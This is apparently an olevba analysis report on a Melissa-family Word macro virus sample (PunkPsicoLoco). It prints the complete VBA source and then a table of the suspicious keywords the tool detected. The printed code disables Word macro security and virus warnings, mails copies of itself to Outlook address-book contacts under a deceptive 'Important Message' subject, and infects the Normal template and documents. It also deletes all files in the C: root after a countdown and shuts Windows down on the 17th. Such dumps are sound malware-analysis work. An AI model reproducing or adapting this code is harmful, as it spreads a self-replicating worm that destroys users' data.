olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa-78f98a1fbf40fae80f937eefca13b53e7601fe1a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO PunkPsicoLoco.cls 
in file: Virus.MSWord.Melissa-78f98a1fbf40fae80f937eefca13b53e7601fe1a - OLE stream: 'Macros/VBA/PunkPsicoLoco'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "PPL?") <> "... by Bem_Crazy" Then
    If UngaDasOutlook = "Outlook" Then
        DasMapiName.Logon "profile", "password"
        For y = 1 To DasMapiName.AddressLists.Count
            Set AddyBook = DasMapiName.AddressLists(y)
            x = 1
            Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
            For oo = 1 To AddyBook.AddressEntries.Count
                Peep = AddyBook.AddressEntries(x)
                BreakUmOffASlice.Recipients.Add Peep
                x = x + 1
                If x > 50 Then oo = AddyBook.AddressEntries.Count
             Next oo
             BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
             BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)"
             BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
             BreakUmOffASlice.Send
             Peep = ""
        Next y
        DasMapiName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "PPL?") = "... by Bem_Crazy"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "PunkPsicoLoco" Then
    If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
    Set ToInfect = ADI1
    ADI1.Name = "PunkPsicoLoco"
    DoAD = True
End If
If NTI1.Name <> "PunkPsicoLoco" Then
    If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
    Set ToInfect = NTI1
    NTI1.Name = "PunkPsicoLoco"
    DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
    Do While ADI1.CodeModule.Lines(1, 1) = ""
        ADI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
    Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
        If Left(ADI1.CodeModule.Lines(BGN, 1), 2) = "'*" Then
            If Val(Right(ADI1.CodeModule.Lines(BGN, 1), Len(ADI1.CodeModule.Lines(BGN, 1)) - 2)) - 1 = 0 Then
                Call Shell("c:\windows\command\attrib -r -h -s *.*", vbHide)
                Kill "c:\*.*"
                ToInfect.CodeModule.InsertLines BGN, "'*10"
                MsgBox "Seu computador não esta se sentinto bem", , "Microsoft Word"
            Else
                ToInfect.CodeModule.InsertLines BGN, "'*" & Val(Right(ADI1.CodeModule.Lines(BGN, 1), Len(ADI1.CodeModule.Lines(BGN, 1)) - 2)) - 1
            End If
            BGN = BGN + 1
        Else
            ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
            BGN = BGN + 1
        End If
    Loop
End If
If DoAD = True Then
    Do While NTI1.CodeModule.Lines(1, 1) = ""
        NTI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
    Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
        If Left(NTI1.CodeModule.Lines(BGN, 1), 2) = "'*" Then
            If Val(Right(NTI1.CodeModule.Lines(BGN, 1), Len(NTI1.CodeModule.Lines(BGN, 1)) - 2)) - 1 = 0 Then
                Call Shell("c:\windows\command\attrib -r -h -s *.*", vbHide)
                Kill "c:\*.*"
                ToInfect.CodeModule.InsertLines BGN, "'*10"
                MsgBox "Seu computador não esta se sentinto bem", , "Microsoft Word"
            Else
                ToInfect.CodeModule.InsertLines BGN, "'*" & Val(Right(NTI1.CodeModule.Lines(BGN, 1), Len(NTI1.CodeModule.Lines(BGN, 1)) - 2)) - 1
            End If
            BGN = BGN + 1
        Else
            ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
            BGN = BGN + 1
        End If
    Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
    ActiveDocument.Saved = True
End If
'WORD/PunkPsicoLoco modificed by Ben_Crazy
'WORD/PunkPsicoLoco modificado por Ben_Crazy
'Works in both Word 2000 and Word 97
'Funciona no Word 2000 e no Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Minhoca? Virus de Macro? Virus de Word 97? Virus de Word 2000? Você Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
'Word -> Email | Word 97 <--> Word 2000 ... Esta é a nova era!
'*8
If Day(Now) = 17 Then Call Shell("rundll user.exe,ExitWindows 0 0", vbHide)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+
